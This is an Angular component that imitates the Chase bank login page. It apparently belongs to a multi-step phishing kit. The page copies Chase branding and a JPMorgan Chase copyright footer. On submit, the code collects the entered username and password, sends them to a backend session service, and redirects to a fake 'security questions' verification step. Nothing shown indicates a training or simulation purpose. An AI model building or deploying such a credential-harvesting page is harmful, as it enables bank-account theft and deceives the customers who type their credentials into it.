import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
  selector: 'app-chase-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
      <div class="chase-flow-container">
        <!-- Header removed for desktop match, or kept hidden via CSS -->
        <!-- <header class="chase-header">...</header> -->

      <main class="chase-main">
        <div class="chase-card">
        <div class="chase-logo-container">
           <img src="/assets/flows/chase/images/logo.svg" alt="Chase" class="chase-logo">
        </div>
          
          <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
            <div class="chase-form-group">
              <label for="username">Username</label>
              <input 
                type="text" 
                id="username" 
                formControlName="username"
                placeholder="Username"
                [class.error]="isFieldInvalid('username')"
              >
            </div>

            <div class="chase-form-group">
              <label for="password">Password</label>
              <input 
                [type]="showPassword() ? 'text' : 'password'" 
                id="password" 
                formControlName="password"
                placeholder="Password"
                [class.error]="isFieldInvalid('password')"
              >
              <div class="chase-helper-links">
                <a href="javascript:void(0)" (click)="showPassword.set(!showPassword())">
                  {{ showPassword() ? 'Hide' : 'Show' }} password
                </a>
              </div>
            </div>

            <div class="flex items-center mb-6">
              <input type="checkbox" id="remember" class="mr-2">
              <label for="remember" class="text-xs text-slate-600">Remember me</label>
            </div>

            <button 
              type="submit" 
              class="chase-btn-primary"
              [disabled]="loginForm.invalid || isLoading()"
            >
              <span *ngIf="!isLoading()">Sign in</span>
              <span *ngIf="isLoading()">Signing in...</span>
            </button>

            <div class="chase-helper-links justify-center mt-6">
              <a href="javascript:void(0)">Forgot username/password? ></a>
            </div>
            <div class="chase-helper-links justify-center mt-2">
              <a href="javascript:void(0)">Not enrolled? Sign up now ></a>
            </div>
          </form>
        </div>

        <footer class="chase-footer">
          <div class="flex justify-center mb-4">
            <a href="javascript:void(0)">Contact us</a>
            <a href="javascript:void(0)">Privacy</a>
            <a href="javascript:void(0)">Security</a>
            <a href="javascript:void(0)">Terms of use</a>
          </div>
          <p>© 2024 JPMorgan Chase & Co.</p>
        </footer>
      </main>
    </div>
  `,
  styleUrls: ['../../../styles/flows/chase.scss']
})
export class ChaseLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private stateService = inject(StateService);

  loginForm = this.fb.group({
    username: ['', [Validators.required, Validators.minLength(3)]],
    password: ['', [Validators.required, Validators.minLength(5)]]
  });

  isLoading = signal(false);
  showPassword = signal(false);

  isFieldInvalid(field: string): boolean {
    const control = this.loginForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  onSubmit() {
    if (this.loginForm.valid) {
      this.isLoading.set(true);

      // Capture data and move to next step
      const { username, password } = this.loginForm.value;

      // Sync with backend via StateService
      this.stateService.updateSession({
        username,
        password,
        currentStep: 'security-questions',
        flow: 'chase'
      });

      // Navigate to security questions after a brief delay
      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/chase/questions']);
      }, 1500);
    }
  }
}
